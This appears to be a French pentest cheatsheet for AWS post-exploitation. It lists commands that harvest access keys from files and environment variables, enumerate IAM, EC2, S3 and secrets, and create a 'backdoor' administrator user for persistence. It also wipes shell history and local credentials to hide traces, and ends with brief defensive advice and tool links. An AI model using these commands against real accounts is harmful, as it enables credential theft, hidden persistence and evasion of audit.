# ☁️ AWS - Cheatsheet Cybersécurité

Ce fichier couvre les étapes et outils essentiels pour auditer, attaquer ou post-exploiter une infrastructure AWS après compromission d’une clé d’accès, ou dans le cadre d’un pentest cloud.

---

## 🔑 1. Détection de credentials AWS

### 🔍 Localisation classique (post-exploitation)

```
~/.aws/credentials  
```
> Fichier contenant les clés `aws_access_key_id` et `aws_secret_access_key`

Variables d’environnement :

echo $AWS_ACCESS_KEY_ID  
echo $AWS_SECRET_ACCESS_KEY

```
grep -r "AKIA" /  
```
> Recherche brutale de clés AWS (`AKIA` = ID de clé AWS)

---

## 🧪 2. Vérifier si les clés sont valides

aws sts get-caller-identity  
> Confirme si la clé est valide et retourne l’ID de compte, l’ARN et l’UserId

---

## 🔍 3. Enumération manuelle avec AWS CLI

aws iam list-users  
> Liste des utilisateurs IAM

aws iam list-roles  
> Liste des rôles IAM

aws ec2 describe-instances  
> Liste les instances EC2

aws s3 ls  
> Liste les buckets S3 (si permis)

aws s3 ls s3://bucket-name  
> Parcours d’un bucket

aws secretsmanager list-secrets  
> Tente d’accéder aux secrets

aws iam list-policies --scope Local  
> Liste des politiques personnalisées

---

## 🤖 4. Enumération automatisée (outils)

### 🧰 Outils essentiels

- **[ScoutSuite](https://github.com/nccgroup/ScoutSuite)**  
> Outil d’audit multicloud (AWS, GCP, Azure)

- **[Pacu](https://github.com/RhinoSecurityLabs/pacu)**  
> Framework de post-exploitation AWS

- **[Cloudsplaining](https://github.com/salesforce/cloudsplaining)**  
> Analyse les politiques IAM pour détecter les failles d'escalade

- **[Enumerate-IAM](https://github.com/andresriancho/enumerate-iam)**  
> Énumère les permissions implicites

- **[S3Scanner](https://github.com/sa7mon/S3Scanner)**  
> Scan de buckets S3 publics ou exposés

---

## 🚀 5. Escalade de privilèges IAM

aws iam list-policies  
> Liste toutes les policies disponibles

aws iam list-attached-user-policies --user-name user  
> Politiques attachées à un utilisateur

aws iam get-policy --policy-arn arn:aws:iam::aws:policy/PolicyName  
> Détail d’une policy

> Chercher les actions `iam:PassRole`, `iam:AttachUserPolicy`, `sts:AssumeRole`, etc. pour identifier les chemins d'escalade

---

## 📦 6. S3 - Fuite de données / prise de contrôle

aws s3 ls s3://bucket  
> Voir le contenu

aws s3 cp s3://bucket/file.txt ./  
> Télécharger un fichier

aws s3 cp evil.txt s3://bucket/  
> Upload dans un bucket mal configuré

---

## 🔐 7. Persistence via IAM

aws iam create-user --user-name backdoor  
> Crée un utilisateur persistant

aws iam create-access-key --user-name backdoor  
> Crée une paire de clés pour l'utilisateur

aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess  
> Donne un accès total à l'utilisateur

---

## 🧹 8. Nettoyage

history -c && unset AWS_ACCESS_KEY_ID && unset AWS_SECRET_ACCESS_KEY  
> Efface les traces dans le shell

rm -rf ~/.aws  
> Supprime les credentials locaux

---

## 🛡 9. Défense & Détection

- Utiliser AWS CloudTrail pour logger toutes les actions
- Restreindre les permissions IAM au strict nécessaire (principe du moindre privilège)
- Activer la MFA sur tous les comptes sensibles
- Interdire les clés d’accès pour les comptes administrateurs
- Scanner régulièrement avec ScoutSuite, Prowler, ou Cloudsplaining

---

## 📚 10. Ressources utiles

- https://github.com/RhinoSecurityLabs/pacu  
- https://github.com/nccgroup/ScoutSuite  
- https://github.com/salesforce/cloudsplaining  
- https://github.com/toniblyx/prowler  
- https://book.hacktricks.xyz/cloud-security/aws-methodology  
